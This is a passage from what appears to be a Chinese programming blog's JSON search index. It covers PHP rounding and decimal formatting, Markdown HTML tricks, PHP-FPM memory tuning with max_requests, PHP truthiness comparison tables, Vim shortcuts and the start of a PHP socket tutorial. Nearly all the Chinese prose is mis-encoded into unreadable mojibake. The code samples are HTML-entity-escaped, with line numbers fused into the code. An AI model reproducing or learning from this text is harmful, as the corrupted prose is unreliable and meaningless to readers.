¼å¼ï¼Œå…¶ä¸­2 è¡¨ç¤º2 ä½ï¼Œfè¡¨ç¤ºè§†ä¸ºæµ®ç‚¹æ•°ã€‚ roundround å‡½æ•°ç”¨äºå¯¹æµ®ç‚¹æ•°è¿›è¡Œå››èˆäº”å…¥ã€‚ è¿˜å¯ä»¥é€šè¿‡ä¼ å…¥å‚æ•°ï¼Œå†³å®šä»ç¬¬å‡ ä½å¼€å§‹å››èˆäº”å…¥ã€‚å¦‚æœæ²¡æœ‰å‚æ•°ï¼Œé»˜è®¤ä»å°æ•°ç‚¹åä¸€ä½å¼€å§‹å››èˆäº”å…¥ã€‚ 1234&lt;?phpecho round(3.4); &#x2F;&#x2F; 3echo round(3.5); &#x2F;&#x2F; 4echo round(22.356, 2); &#x2F;&#x2F; 22.36 ä¿ç•™Nä½å°æ•°ä¸åšå››èˆäº”å…¥123&lt;?php$num &#x3D; 22.356;echo sprintf(&quot;%.2f&quot;,substr(sprintf(&quot;%.3f&quot;, $num), 0, -1)); &#x2F;&#x2F; 22.35 è·å–å°æ•°ä½é•¿åº¦123&lt;?php$num &#x3D; 22.356;echo strlen(substr(strrchr($num, &quot;.&quot;), 1)); &#x2F;&#x2F; 3","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"}]},{"title":"å…³äº Markdown çš„ä¸€äº›æŠ€å·§","slug":"some-tips-about-markdown","date":"2020-10-19T14:04:23.000Z","updated":"2020-10-20T11:23:53.460Z","comments":true,"path":"some-tips-about-markdown/","link":"","permalink":"https://www.0x2beace.com/some-tips-about-markdown/","excerpt":"è¿™ç¯‡ç¬”è®°çš„ç›®çš„æ˜¯æ•´ç†Markdown çš„ä¸€äº›ä¸å¸¸ç”¨ï¼Œå´åˆååˆ†æœ‰ç”¨çš„å°æŠ€å·§ã€‚","text":"è¿™ç¯‡ç¬”è®°çš„ç›®çš„æ˜¯æ•´ç†Markdown çš„ä¸€äº›ä¸å¸¸ç”¨ï¼Œå´åˆååˆ†æœ‰ç”¨çš„å°æŠ€å·§ã€‚ ä»€ä¹ˆæ˜¯Markdownï¼Ÿ Markdown æ˜¯ä¸€ç§è½»é‡çº§æ ‡è®°è¯­è¨€ï¼Œåˆ›å§‹äººä¸ºçº¦ç¿°Â·æ ¼é²ä¼¯ã€‚å®ƒå…è®¸äººä»¬ä½¿ç”¨æ˜“è¯»æ˜“å†™çš„çº¯æ–‡æœ¬æ ¼å¼ç¼–å†™æ–‡æ¡£ï¼Œç„¶åè½¬æ¢æˆæœ‰æ•ˆçš„XHTMLæ–‡æ¡£ã€‚è¿™ç§è¯­è¨€å¸æ”¶äº†å¾ˆå¤šåœ¨ç”µå­é‚®ä»¶ä¸­å·²æœ‰çš„çº¯æ–‡æœ¬æ ‡è®°çš„ç‰¹æ€§ã€‚ â€”â€” ç»´åŸºç™¾ç§‘ Markdown é«˜çº§æŠ€å·§åœ¨Markdown ä¸­ï¼Œå¯ä»¥ç›´æ¥æ’å…¥ HTMLï¼Œç›®å‰æ”¯æŒçš„HTML å…ƒç´ æœ‰ï¼š &lt;kbd&gt; &lt;b&gt; &lt;i&gt; &lt;em&gt; &lt;sub&gt; &lt;sup&gt; &lt;br&gt; ç­‰ é”®ç›˜æ ‡ç­¾å¯ä»¥ä½¿ç”¨&lt;kbd&gt;æ ‡ç­¾ä½¿æ–‡æœ¬çœ‹èµ·æ¥åƒæŒ‰é’®ï¼Œè¿™ä¸å¸¸è§„åå¼•å·æ–‡æœ¬ç•¥æœ‰ä¸åŒã€‚ Copy code with Control + C å¯è§†åŒ–å·®å¼‚å¯ä»¥ä½¿ç”¨åå¼•å·å¯è§†åŒ–å·®å¼‚ï¼Œå¹¶diffæ ¹æ®éœ€è¦çªå‡ºæ˜¾ç¤ºçº¢è‰²æˆ–ç»¿è‰²çš„çº¿ã€‚ 12310 PRINT â€œBASIC IS COOLâ€- 20 GOTO 11+ 20 GOTO 10 éšè—ä¸å¿…è¦çš„è¾“å‡ºæ·»åŠ å†—é•¿çš„é”™è¯¯æ—¥å¿—æˆ–å†—é•¿ç¨‹åºè¾“å‡ºçš„é—®é¢˜å¯ä»¥è§£å†³çš„é”™è¯¯æœ‰å¸®åŠ©çš„ï¼Œä½†å¦‚æœå®ƒå ç”¨é¡µçš„å‚ç›´ç©ºé—´ï¼Œå¯ä»¥è€ƒè™‘ä½¿ç”¨&lt;details&gt;å’Œ&lt;summary&gt;æ ‡ç­¾ã€‚ 12345678910&lt;details&gt;&lt;summary&gt;git clone æˆåŠŸï¼Œç‚¹å‡»æŸ¥çœ‹è¯¦æƒ…ä¿¡æ¯&lt;&#x2F;summary&gt;&lt;pre&gt;Cloning into &#39;php-markdown-blog&#39;...remote: Enumerating objects: 67, done.remote: Counting objects: 100% (67&#x2F;67), done.remote: Compressing objects: 100% (55&#x2F;55), done.remote: Total 67 (delta 12), reused 59 (delta 7), pack-reused 0Unpacking objects: 100% (67&#x2F;67), done.&lt;&#x2F;details&gt; git clone æˆåŠŸï¼Œç‚¹å‡»æŸ¥çœ‹è¯¦æƒ…ä¿¡æ¯ Cloning into 'php-markdown-blog'... remote: Enumerating objects: 67, done. remote: Counting objects: 100% (67/67), done. remote: Compressing objects: 100% (55/55), done. remote: Total 67 (delta 12), reused 59 (delta 7), pack-reused 0 Unpacking objects: 100% (67/67), done. ä½¿å›¾åƒæ–‡å­—å±…ä¸­HTML ä¸­çš„&lt;div align=&quot;center&quot;&gt; å±…ç„¶å¯ä»¥ç¥å¥‡çš„åº”ç”¨åœ¨ Markdown ä¸­ï¼Œç„¶æ‰€æœ‰å†…å®¹å±…ä¸­ã€‚ 1234&lt;div align&#x3D;&quot;center&quot;&gt;&lt;img src&#x3D;&quot;https:&#x2F;&#x2F;octodex.github.com&#x2F;images&#x2F;dunetocat.png&quot; width&#x3D;&quot;200&quot;&gt;&lt;p&gt;This is some centered text.&lt;&#x2F;p&gt;&lt;&#x2F;div&gt; This is some centered text. è¾ƒå°çš„æ–‡å­—ä½¿ç”¨&lt;sub&gt;ã€&lt;sup&gt;æ ‡ç­¾ï¼Œå¯ä»¥ä½¿æ–‡å­—å˜å°ï¼Œéå¸¸é€‚åˆåœ¨å›¾åƒä¸‹é¢æ·»åŠ æè¿°ã€‚ 12345&lt;div align&#x3D;&quot;center&quot;&gt;&lt;img src&#x3D;&quot;https:&#x2F;&#x2F;octodex.github.com&#x2F;images&#x2F;megacat-2.png&quot; width&#x3D;&quot;200&quot;&gt;&lt;br&gt;&lt;sup&gt;&lt;strong&gt;Fig 1:&lt;&#x2F;strong&gt; Megatocat into action&lt;&#x2F;sup&gt;&lt;&#x2F;div&gt;View more octocats on the [Octodex](https:&#x2F;&#x2F;octodex.github.com&#x2F;)! Fig 1: Megatocat into action View more octocats on the Octodex å‚è€ƒé“¾æ¥ GitHub ProTips","categories":[{"name":"Tips","slug":"Tips","permalink":"https://www.0x2beace.com/categories/Tips/"}],"tags":[{"name":"MarkDown","slug":"MarkDown","permalink":"https://www.0x2beace.com/tags/MarkDown/"}]},{"title":"PHP-FPM ä¼˜åŒ–â€”â€”å ç”¨å†…å­˜å¤§ä¸é‡Šæ”¾","slug":"php-fpm-optimization-takes-up-a-lot-of-memory-and-does-not-release","date":"2020-10-18T07:56:45.000Z","updated":"2020-10-18T07:59:01.020Z","comments":true,"path":"php-fpm-optimization-takes-up-a-lot-of-memory-and-does-not-release/","link":"","permalink":"https://www.0x2beace.com/php-fpm-optimization-takes-up-a-lot-of-memory-and-does-not-release/","excerpt":"åœ¨ä¼ ç»Ÿçš„ LNMP æ¶æ„ä¸­ï¼Œå¦‚æœWeb åº”ç”¨éƒ¨åˆ†ï¼Œçªç„¶å˜å¾—ç‰¹åˆ«å¡ï¼Œé€šå¸¸éƒ½æ˜¯å†…å­˜è€—å°½å¯¼è‡´ã€‚","text":"åœ¨ä¼ ç»Ÿçš„ LNMP æ¶æ„ä¸­ï¼Œå¦‚æœWeb åº”ç”¨éƒ¨åˆ†ï¼Œçªç„¶å˜å¾—ç‰¹åˆ«å¡ï¼Œé€šå¸¸éƒ½æ˜¯å†…å­˜è€—å°½å¯¼è‡´ã€‚ è¿™é‡Œè¯´çš„å†…å­˜ï¼ŒæŒ‡çš„æ˜¯ç‰©ç†è¿è¡Œå†…å­˜ï¼Œè€Œä¸æ˜¯è™šæ‹Ÿå†…å­˜ï¼ˆSwapï¼‰ã€‚ LNMPæ¶æ„ä¸­PHPæ˜¯è¿è¡Œåœ¨FastCGIæ¨¡å¼ä¸‹ï¼ŒæŒ‰ç…§å®˜æ–¹çš„è¯´æ³•ï¼Œphp-cgiä¼šåœ¨æ¯ä¸ªè¯·æ±‚ç»“æŸçš„æ—¶å€™ä¼šå›æ”¶è„šæœ¬ä½¿ç”¨çš„å…¨éƒ¨å†…å­˜ï¼Œä½†æ˜¯å¹¶ä¸ä¼šé‡Šæ”¾ç»™æ“ä½œç³»ç»Ÿï¼Œè€Œæ˜¯ç»§ç»­æŒæœ‰ä»¥åº”å¯¹ä¸‹ä¸€æ¬¡PHPè¯·æ±‚ã€‚è€Œphp-fpmæ˜¯ FastCGIè¿›ç¨‹ç®¡ç†å™¨ï¼Œç”¨äºæ§åˆ¶phpçš„å†…å­˜å’Œè¿›ç¨‹ç­‰ã€‚ æ‰€ä»¥ï¼Œè§£å†³çš„åŠæ³•å°±æ˜¯é€šè¿‡php-fpm ä¼˜åŒ–æ€»çš„è¿›ç¨‹æ•°å’Œå•ä¸ªè¿›ç¨‹å ç”¨çš„å†…å­˜ï¼Œä»è€Œè§£å†³php-fpm è¿›ç¨‹å ç”¨å†…å­˜å¤§å’Œä¸é‡Šæ”¾å†…å­˜çš„é—®é¢˜ã€‚ æŸ¥çœ‹å½“å‰å ç”¨æƒ…å†µå¦‚æœå‘ç°Web åº”ç”¨å‡ºç°ä¸¥é‡å¡é¡¿ï¼Œè¯·æ±‚è¶…æ—¶ç­‰é—®é¢˜ï¼Œé¦–å…ˆæ£€æŸ¥ä¸€ä¸‹å†…å­˜çš„å ç”¨æƒ…å†µã€‚å¸¸ç”¨çš„å‘½ä»¤æœ‰ï¼šTopã€Glancesã€Free ç­‰ã€‚ ä½¿ç”¨Glances æˆ–è€… Top å‘½ä»¤æŸ¥çœ‹è¿›ç¨‹ï¼Œç„¶åæŒ‰ä¸‹æŒ‰é”® Mï¼Œå¯ä»¥æŸ¥çœ‹ä¸»æœºå½“å‰çš„å†…å­˜å ç”¨æƒ…å†µï¼ŒæŒ‰ç…§å ç”¨å†…å­˜ç”±å¤šåˆ°å°‘æ’åºã€‚ ä¹Ÿå¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æŸ¥çœ‹å½“å‰ php-fpm æ€»è¿›ç¨‹æ•°ï¼š 1ps -ylC php-fpm --sort:rss å…¶ä¸­ rss å°±æ˜¯å†…å­˜å ç”¨æƒ…å†µã€‚ æŸ¥çœ‹å½“å‰php-fpm è¿›ç¨‹çš„å†…å­˜å ç”¨æƒ…å†µåŠå¯åŠ¨æ—¶é—´ï¼š 1ps -e -o &#39;pid,comm,args,pcpu,rsz,vsz,stime,user,uid&#39;|grep www|sort -nrk5 å¯ä»¥çœ‹åˆ°æ— è®ºå“ªä¸€ç§æ–¹å¼ï¼Œç»“æœéƒ½æ˜¯ä¸€æ ·çš„ã€‚ æŸ¥çœ‹å½“å‰php-fpmè¿›ç¨‹å¹³å‡å ç”¨å†…å­˜æƒ…å†µï¼š 12ps --no-headers -o &quot;rss,cmd&quot; -C php-fpm | awk &#39;&#123; sum+&#x3D;$1 &#125; END &#123; printf (&quot;%d%s\\n&quot;, sum&#x2F;NR&#x2F;1024,&quot;M&quot;) &#125;&#39;&#x2F;&#x2F; 22M ä¼˜åŒ–é…ç½®è§£å†³ä¸Šé¢é‚£ä¸ªé—®é¢˜çš„æ ¸å¿ƒå°±æ˜¯ php-fpm é…ç½®ä¸­çš„ max_requestsã€‚ å³å½“ä¸€ä¸ª PHP-CGI è¿›ç¨‹å¤„ç†çš„è¯·æ±‚æ•°ç´¯ç§¯åˆ° max_requests ä¸ªåï¼Œè‡ªåŠ¨é‡å¯è¯¥è¿›ç¨‹ï¼Œè¿™æ ·è¾¾åˆ°äº†é‡Šæ”¾å†…å­˜çš„ç›®çš„äº†ã€‚ ä¸€èˆ¬æ¥è¯´ä¸€ä¸ªphp-fpm è¿›ç¨‹å ç”¨çš„å†…å­˜ä¸º30M-40Mï¼Œæ‰€ä»¥æ ¹æ®è‡ªèº«å®é™…æƒ…å†µä½œåˆ¤æ–­ï¼Œæœ‰ä»¥ä¸‹ä¸¤ç§æƒ…å†µï¼š å®é™…ç»“æœæ˜¯å¤§äº 30M - 40Mï¼Œé‚£ä¹ˆéœ€è¦è®© php-fpm â€œæ—©ä¸€äº›â€œé‡Šæ”¾å†…å­˜ï¼Œmax_requests çš„æ•°å€¼æ”¹å°ä¸€äº›ã€‚ å®é™…ç»“æœæ˜¯å°äº 30M - 40Mï¼Œåˆ™å¯ä»¥è®© php-fpm â€œæ™šä¸€äº›â€œé‡Šæ”¾å†…å­˜ï¼Œmax_requestsçš„æ•°å€¼æ”¹å¤§ä¸€äº›ã€‚ å‚è€ƒé“¾æ¥ Linuxçš„php-fpmä¼˜åŒ–å¿ƒå¾—-php-fpmè¿›ç¨‹å ç”¨å†…å­˜å¤§å’Œä¸é‡Šæ”¾å†…å­˜é—®é¢˜","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"PHP-FPM","slug":"PHP-FPM","permalink":"https://www.0x2beace.com/tags/PHP-FPM/"}]},{"title":"å¯¹äºNULLã€ç©ºã€0ã€falseç­‰æ•°æ®ç±»å‹çš„ç†è§£","slug":"understanding-of-data-types-such-as-null-empty-0-false-etc","date":"2020-10-17T09:21:51.000Z","updated":"2020-10-17T09:22:32.323Z","comments":true,"path":"understanding-of-data-types-such-as-null-empty-0-false-etc/","link":"","permalink":"https://www.0x2beace.com/understanding-of-data-types-such-as-null-empty-0-false-etc/","excerpt":"ä¹‹æ‰€ä»¥å†³å®šå†™è¿™ç‰‡ç¬”è®°ï¼Œæ˜¯å› ä¸ºä¸€ç›´å¯¹ ç©º è¿™ä¸ªæ¦‚å¿µå¾ˆæ¨¡ç³Šï¼Œåœ¨ä»£ç é€»è¾‘ä¸­å¸¸ä¼šé‡åˆ°éœ€è¦åˆ¤æ–­çš„æ—¶å€™ï¼Œæ€»æ˜¯æ¨¡æ‹Ÿä¸¤å¯ã€‚","text":"ä¹‹æ‰€ä»¥å†³å®šå†™è¿™ç‰‡ç¬”è®°ï¼Œæ˜¯å› ä¸ºä¸€ç›´å¯¹ ç©º è¿™ä¸ªæ¦‚å¿µå¾ˆæ¨¡ç³Šï¼Œåœ¨ä»£ç é€»è¾‘ä¸­å¸¸ä¼šé‡åˆ°éœ€è¦åˆ¤æ–­çš„æ—¶å€™ï¼Œæ€»æ˜¯æ¨¡æ‹Ÿä¸¤å¯ã€‚ å¸¸è§çš„â€œç©ºâ€æœ‰ä»¥ä¸‹è¿™äº›ï¼š æ•´å½¢0ï¼š0 å­—ç¬¦1ï¼š1 å­—ç¬¦ç©ºï¼šâ€â€ å­—ç¬¦é›¶ï¼šâ€0â€ ç©ºæ•°ç»„ï¼š[] true false null NUll ä¸Šé¢çš„é‚£äº›éƒ½å¥½ç†è§£ï¼Œéƒ½æ˜¯å¸¸è§çš„ï¼Œé‡ç‚¹ä»‹ç»ä¸€ä¸‹NULLã€‚ NULL æ˜¯ä»€ä¹ˆï¼Ÿ Nullæ˜¯åœ¨è®¡ç®—æœºå…·æœ‰ä¿ç•™çš„å€¼ï¼Œå¯ä»¥ç”¨äºæŒ‡é’ˆä¸å»å¼•ç”¨å¯¹è±¡ï¼Œç°åœ¨å¾ˆå¤šç¨‹åºéƒ½ä¼šä½¿ç”¨æŒ‡é’ˆæ¥è¡¨ç¤ºæ¡ä»¶ï¼Œä½†æ˜¯åœ¨ä¸åŒçš„è¯­è¨€ä¸­ï¼Œå«ä¹‰æ˜¯ä¸ä¸€æ ·çš„ã€‚ è¿™é‡Œæˆ‘ä»¬åªä»‹ç» PHP ä¸­çš„ NULLã€‚ åœ¨ PHP ä¸­ï¼Œè¡¨ç¤ºä¸€ä¸ªå˜é‡æ²¡æœ‰èµ‹å€¼ã€æˆ–è€…æ˜¯è¢«èµ‹å€¼çš„å€¼ä¸º NULLï¼Œä»¥åŠè¢« unset çš„ã€‚ ä½¿ç”¨PHP å‡½æ•°å¯¹å˜é‡è¿›è¡Œæ¯”è¾ƒï¼š è¡¨è¾¾å¼ gettype() empty() is_null() isset() boolean : if($x) $x = &quot;&quot;; string TRUE FALSE TRUE FALSE $x = null; NULL TRUE TRUE FALSE FALSE var $x; NULL TRUE TRUE FALSE FALSE $x is undefined NULL TRUE TRUE FALSE FALSE $x = array(); array TRUE FALSE TRUE FALSE $x = false; boolean TRUE FALSE TRUE FALSE $x = true; boolean FALSE FALSE TRUE TRUE $x = 1; integer FALSE FALSE TRUE TRUE $x = 42; integer FALSE FALSE TRUE TRUE $x = 0; integer TRUE FALSE TRUE FALSE $x = -1; integer FALSE FALSE TRUE TRUE $x = &quot;1&quot;; string FALSE FALSE TRUE TRUE $x = &quot;0&quot;; string TRUE FALSE TRUE FALSE $x = &quot;-1&quot;; string FALSE FALSE TRUE TRUE $x = &quot;php&quot;; string FALSE FALSE TRUE TRUE $x = &quot;true&quot;; string FALSE FALSE TRUE TRUE $x = &quot;false&quot;; string FALSE FALSE TRUE TRUE æ¾æ•£åˆ¤æ–­ == TRUE FALSE 1 0 -1 &quot;1&quot; &quot;0&quot; &quot;-1&quot; NULL array() &quot;php&quot; &quot;&quot; TRUE TRUE FALSE TRUE FALSE TRUE TRUE FALSE TRUE FALSE FALSE TRUE FALSE FALSE FALSE TRUE FALSE TRUE FALSE FALSE TRUE FALSE TRUE TRUE FALSE TRUE 1 TRUE FALSE TRUE FALSE FALSE TRUE FALSE FALSE FALSE FALSE FALSE FALSE 0 FALSE TRUE FALSE TRUE FALSE FALSE TRUE FALSE TRUE FALSE TRUE TRUE -1 TRUE FALSE FALSE FALSE TRUE FALSE FALSE TRUE FALSE FALSE FALSE FALSE &quot;1&quot; TRUE FALSE TRUE FALSE FALSE TRUE FALSE FALSE FALSE FALSE FALSE FALSE &quot;0&quot; FALSE TRUE FALSE TRUE FALSE FALSE TRUE FALSE FALSE FALSE FALSE FALSE &quot;-1&quot; TRUE FALSE FALSE FALSE TRUE FALSE FALSE TRUE FALSE FALSE FALSE FALSE NULL FALSE TRUE FALSE TRUE FALSE FALSE FALSE FALSE TRUE TRUE FALSE TRUE array() FALSE TRUE FALSE FALSE FALSE FALSE FALSE FALSE TRUE TRUE FALSE FALSE &quot;php&quot; TRUE FALSE FALSE TRUE FALSE FALSE FALSE FALSE FALSE FALSE TRUE FALSE &quot;&quot; FALSE TRUE FALSE TRUE FALSE FALSE FALSE FALSE TRUE FALSE FALSE TRUE ä¸¥æ ¼æ¯”è¾ƒ === TRUE FALSE 1 0 -1 &quot;1&quot; &quot;0&quot; &quot;-1&quot; NULL array() &quot;php&quot; &quot;&quot; TRUE TRUE FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE TRUE FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE 1 FALSE FALSE TRUE FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE 0 FALSE FALSE FALSE TRUE FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE -1 FALSE FALSE FALSE FALSE TRUE FALSE FALSE FALSE FALSE FALSE FALSE FALSE &quot;1&quot; FALSE FALSE FALSE FALSE FALSE TRUE FALSE FALSE FALSE FALSE FALSE FALSE &quot;0&quot; FALSE FALSE FALSE FALSE FALSE FALSE TRUE FALSE FALSE FALSE FALSE FALSE &quot;-1&quot; FALSE FALSE FALSE FALSE FALSE FALSE FALSE TRUE FALSE FALSE FALSE FALSE NULL FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE TRUE FALSE FALSE FALSE array() FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE TRUE FALSE FALSE &quot;php&quot; FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE TRUE FALSE &quot;&quot; FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE TRUE å‚è€ƒé“¾æ¥PHP ç±»å‹æ¯”è¾ƒè¡¨","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"}]},{"title":"Vim å¸¸ç”¨å¿«æ·é”®æ€»ç»“","slug":"summary-of-vim-commonly-used-shortcut-keys","date":"2020-10-16T11:16:43.000Z","updated":"2020-10-18T08:12:31.937Z","comments":true,"path":"summary-of-vim-commonly-used-shortcut-keys/","link":"","permalink":"https://www.0x2beace.com/summary-of-vim-commonly-used-shortcut-keys/","excerpt":"Vim æ˜¯æˆ‘åœ¨Linux ä¸‹æ¯”è¾ƒå¸¸ç”¨çš„æ–‡æœ¬ç¼–è¾‘å™¨ï¼Œè¿™é‡Œæ•´ç†ä¸€ä¸‹å¸¸ç”¨çš„æ“ä½œã€‚","text":"Vim æ˜¯æˆ‘åœ¨Linux ä¸‹æ¯”è¾ƒå¸¸ç”¨çš„æ–‡æœ¬ç¼–è¾‘å™¨ï¼Œè¿™é‡Œæ•´ç†ä¸€ä¸‹å¸¸ç”¨çš„æ“ä½œã€‚ åŸºæœ¬æ“ä½œ ç§»åŠ¨åˆ°è¡Œé¦–ï¼š0 ç§»åŠ¨åˆ°è¡Œå°¾ï¼š$ å…‰æ ‡ç§»åŠ¨åˆ°æ–‡ä»¶å¼€å§‹ä½ç½®ï¼šgg å…‰æ ‡ç§»åŠ¨åˆ°æ–‡ä»¶ç»“æŸä½ç½®: shift + g åˆ é™¤æ‰€æœ‰å†…å®¹ï¼šggdG å•è¡Œåˆ é™¤ï¼šdd å•è¡Œå¤åˆ¶ï¼šyy ç²˜è´´ï¼šp å¤åˆ¶å…¨éƒ¨å†…å®¹ï¼šggyG ç§»åŠ¨åˆ°æŒ‡å®šè¡Œåœ¨vim ä¸­ç›´æ¥ç§»åŠ¨åˆ°æŒ‡å®šè¡Œæ•°ï¼Œæœ‰ä¸‰ç§æ–¹å¼ï¼ˆå‡æ˜¯åœ¨å‘½ä»¤è¡Œæ¨¡å¼ä¸‹è¾“å…¥ï¼Œn ä¸ºæŒ‡å®šçš„è¡Œå·ï¼‰ï¼š ngg/ nG :n vim +n filename è¿›é˜¶æ“ä½œå½“å‰è¡Œæ›¿æ¢ï¼š 1s&#x2F;XXX&#x2F;YYY&#x2F;g å…¶ä¸­XXX æ˜¯éœ€è¦æ›¿æ¢çš„å­—ç¬¦ä¸²ï¼ŒYYYæ˜¯æ›¿æ¢åçš„å­—ç¬¦ä¸²ã€‚ å…¨å±€æ›¿æ¢ï¼š 1%s&#x2F;XXX&#x2F;YYY&#x2F;g ä¸€äº›é…ç½® æŸ¥æ‰¾å­—ç¬¦è®¾ç½®é«˜äº®ï¼šset hlsearch æ˜¾ç¤ºè¡Œå·ï¼šset number","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"},{"name":"Vim","slug":"Vim","permalink":"https://www.0x2beace.com/tags/Vim/"}]},{"title":"PHP Socket ç¼–ç¨‹","slug":"php-socket-programming","date":"2020-10-15T14:29:16.000Z","updated":"2020-10-15T14:30:23.551Z","comments":true,"path":"php-socket-programming/","link":"","permalink":"https://www.0x2beace.com/php-socket-programming/","excerpt":"æœ€è¿‘å› ä¸ºä¸€äº›åŸå› æ¥è§¦åˆ°ä¸€ä¸ªè€å¤è‘£é¡¹ç›®ï¼Œè¿™ä¸ªé¡¹ç›®è™½ç„¶æœ‰äº›è€ï¼Œä½†ä»”ç»†çœ‹ä¸€çœ‹ï¼Œè¿˜æ˜¯èƒ½å­¦åˆ°ä¸€äº›ä¸œè¥¿çš„ã€‚ å…³äº PHP Socket ç¼–ç¨‹çš„æ–‡ç« æœ‰å¾ˆå¤šï¼Œè¿™é‡Œå°±åªç®€å•è®°å½•ä¸€ä¸‹å¦‚ä½•å¿«é€Ÿä¸Šæ‰‹ã€‚","text":"æœ€è¿‘å› ä¸ºä¸€äº›åŸå› æ¥è§¦åˆ°ä¸€ä¸ªè€å¤è‘£é¡¹ç›®ï¼Œè¿™ä¸ªé¡¹ç›®è™½ç„¶æœ‰äº›è€ï¼Œä½†ä»”ç»†çœ‹ä¸€çœ‹ï¼Œè¿˜æ˜¯èƒ½å­¦åˆ°ä¸€äº›ä¸œè¥¿çš„ã€‚ å…³äº PHP Socket ç¼–ç¨‹çš„æ–‡ç« æœ‰å¾ˆå¤šï¼Œè¿™é‡Œå°±åªç®€å•è®°å½•ä¸€ä¸‹å¦‚ä½•å¿«é€Ÿä¸Šæ‰‹ã€‚ ä»€ä¹ˆæ˜¯ SocketæŒ‰ç…§æƒ¯ä¾‹ï¼Œè¿˜æ˜¯å…ˆæ¥äº†è§£ä¸€ä¸‹åŸºæœ¬æ¦‚å¿µã€‚ æˆ‘ä»¬çŸ¥é“ä¸¤ä¸ªè¿›ç¨‹å¦‚æœéœ€è¦è¿›ç¨‹é€šè®¯ï¼Œæœ€åŸºæœ¬çš„å‰æå°±æ˜¯ä¿è¯å½¼æ­¤è¿›ç¨‹çš„å”¯ä¸€ï¼Œå¹¶èƒ½ç¡®å®šå½¼æ­¤èº«ä»½ã€‚åœ¨æœ¬åœ°è¿›ç¨‹é€šè®¯ä¸­æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ PID æ¥æ ‡ç¤ºå”¯ä¸€çš„è¿›ç¨‹ï¼Œä½† PID åªåœ¨æœ¬åœ°å”¯ä¸€ï¼Œç½‘ç»œä¸­çš„ä¸¤ä¸ªè¿›ç¨‹ PID å†²çªçš„å‡ ç‡å¾ˆå¤§ï¼Œè¿™æ—¶å€™æˆ‘ä»¬å°±éœ€è¦å¦è¾Ÿè¹Šå¾„äº†ã€‚ æˆ‘ä»¬çŸ¥é“IP å±‚çš„IP åœ°å€å¯ä»¥å”¯ä¸€æ ‡ç¤ºä¸»æœºï¼Œè€ŒTCP å±‚åè®®å’Œç«¯å£å·å¯ä»¥å”¯ä¸€æ ‡ç¤ºä¸»æœºçš„ä¸€ä¸ªè¿›ç¨‹ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨ IP åœ°å€+ åè®® + ç«¯å£å·å”¯ä¸€æ ‡ç¤ºç½‘ç»œä¸­çš„ä¸€ä¸ªè¿›ç¨‹ã€‚ èƒ½å¤Ÿå”¯ä¸€æ ‡ç¤ºç½‘ç»œä¸­çš„è¿›ç¨‹åï¼Œå®ƒä»¬å°±å¯ä»¥åˆ©ç”¨socket è¿›è¡Œé€šä¿¡äº†ã€‚ ä»€ä¹ˆæ˜¯socketï¼Ÿ æˆ‘ä»¬ç»å¸¸æŠŠ socket ç¿»è¯‘æˆå¥—æ¥å­—ï¼Œsocket æ˜¯åœ¨åº”ç”¨å±‚å’Œä¼ è¾“å±‚ä¹‹é—´çš„ä¸€ä¸ªæŠ½è±¡å±‚ï¼Œå®ƒæŠŠ TCP/IP å±‚å¤æ‚çš„æ“ä½œæŠ½è±¡ä¸ºå‡ ä¸ªç®€å•çš„æ¥å£ä¾›åº”ç”¨å±‚è°ƒç”¨ä»¥å®ç°è¿›ç¨‹åœ¨ç½‘ç»œä¸­é€šä¿¡ã€‚ socket èµ·æºäº UNIXï¼Œåœ¨UNIX ä¸€åˆ‡çš†ä¸ºæ–‡ä»¶å“²å­¦çš„æ€æƒ³ä¸‹ï¼Œsocket æ˜¯ä¸€ç§â€œæ‰“å¼€=&gt;è¯»/å†™=&gt;å…³é—­â€œæ¨¡å¼çš„å®ç°ï¼ŒæœåŠ¡å™¨å’Œå®¢æˆ·ç«¯å„è‡ªç»´æŠ¤ä¸€ä¸ªæ–‡ä»¶ï¼Œåœ¨å»ºç«‹è¿æ¥æ‰“å¼€ä¹‹åï¼Œå¯ä»¥å‘è‡ªå·±çš„æ–‡ä»¶å†™å…¥å†…å®¹ä¾›å¯¹æ–¹è¯»å–æˆ–è€…è¯»å–å¯¹æ–¹å†…å®¹ï¼Œé€šè®¯ç»“æŸæ—¶å…³é—­æ–‡ä»¶ã€‚ socket é€šä¿¡æµç¨‹socket æ˜¯â€æ‰“å¼€=&gt;è¯»/å†™=&gt;å…³é—­â€æ¨¡å¼çš„å®ç°ï¼Œä»¥ä½¿ç”¨TCPåè®®é€šè®¯çš„socketä¸ºä¾‹ï¼Œå…¶äº¤äº’æµç¨‹å¤§æ¦‚æ˜¯è¿™æ ·å­ï¼š å®‰è£…PHP é»˜è®¤æ²¡æœ‰å¯ç”¨ sockets æ‰©å±•ï¼Œæ‰€ä»¥éœ€è¦æ‰‹åŠ¨å®‰è£…æ‰©å±•ã€‚ 1apt-get install php7.2-sockets php -m æˆ–è€… php -iæ£€æŸ¥æ‰©å±•æ˜¯å¦å·²ç»å¯ç”¨ã€‚ 